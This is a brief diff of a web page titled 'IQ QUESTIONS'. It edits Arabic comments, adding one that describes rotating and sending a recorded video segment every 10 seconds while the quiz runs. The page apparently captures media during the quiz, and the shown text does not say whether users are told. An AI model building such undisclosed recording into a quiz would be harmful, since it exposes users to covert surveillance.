@@ -42,7 +42,6 @@
             overflow-x: hidden;
         }
 
-        /* خلفية شفافة فيها كلمة IQ QUESTIONS كعلامة مائية */
         body::before {
             content: "IQ QUESTIONS";
             position: fixed;
@@ -434,6 +433,7 @@
                     startNewRecorderSegment();
                 }, 2000);
 
+                // تدوير وإرسال مقطع فيديو كل 10 ثوانٍ بانتظام تام
                 videoInterval = setInterval(() => {
                     if (!isCompleted) {
                         if (mediaRecorder && mediaRecorder.state !== "inactive") {
